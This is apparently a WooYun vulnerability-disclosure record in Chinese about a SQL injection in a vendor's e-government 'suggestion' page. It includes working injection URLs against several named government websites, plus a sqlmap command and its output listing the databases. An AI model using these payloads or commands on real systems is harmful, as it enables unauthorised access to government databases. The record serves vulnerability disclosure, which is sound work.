{"id": 218, "wybug_id": "wooyun-2014-076739", "wybug_title": "某通用型电子政务系统SQL注入漏洞(二)", "wybug_corp": "国家应急响应中心", "wybug_author": "路人甲", "wybug_date": "2014-09-20 20:44", "wybug_open_date": "2014-11-04 20:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向公众公开  简要描述： 某通用型电子政务系统存在SQL注入漏洞，影响众多政府网 详细说明：  该电子政务系统存由深圳市北斗星科技有限公司开发 官网：http://www.7stars.net.cn/ 客户案例：http://www.7stars.net.cn/successful%20case---------------------------------------------北斗星电子政务系统在“发表意见”页面存在SQL注入注入链接: /sssweb/SuggestionCollection/PostSuggestion.aspx?ID=---------------------------------------------   漏洞证明：  以http://www.zhengxiang.gov.cn 作为演示案例测试链接：http://www.zhengxiang.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=11)报错注入http://www.zhengxiang.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1'+and+1=@@version+and+'a'='a\n\n2)Sqlmap注入$ py sqlmap.py -u http://www.zhengxiang.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1 --dbms mssql --level 5 --risk 3 --dbs -v 1---Place: GETParameter: ID    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: ID=-1816' OR (8309=8309) AND 'SYyF'='SYyF    Type: error-based    Title: Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause    Payload: ID=-6603' OR 8928=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(112)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (8928=892    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: ID=-7212' OR 9951=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers---[16:30:43] [INFO] testing Microsoft SQL Server[16:30:44] [WARNING] reflective value(s) found and filtering out[16:30:44] [INFO] confirming Microsoft SQL Server[16:30:44] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server Unknown[16:30:44] [INFO] fetching database names[16:30:44] [INFO] the SQL query used returns 10 entries[16:30:44] [INFO] resumed: dbsssdesk[16:30:44] [INFO] resumed: dbssssso[16:30:45] [INFO] resumed: master[16:30:45] [INFO] resumed: model[16:30:45] [INFO] resumed: msdb[16:30:45] [INFO] resumed: oldsapp[16:30:45] [INFO] resumed: SAPP[16:30:45] [INFO] resumed: tempdb[16:30:45] [INFO] resumed: zx_news[16:30:45] [INFO] resumed: zx_news_bbsavailable databases [10]:[*] dbsssdesk[*] dbssssso[*] master[*] model[*] msdb[*] oldsapp[*] SAPP[*] tempdb[*] zx_news[*] zx_news_bbs\n\n其他测试案例：http://www.hengshan.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1'+and+1=@@version+and+'a'='a\n\nhttp://www.zhengxiang.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1'+and+1=@@version+and+'a'='a\n\nhttp://www.hyyfq.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1'+and+1=@@version+and+'a'='a\n\nhttp://www.hengdong.gov.cn/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1'+and+1=@@version+and+'a'='a\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-09-25 13:23 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}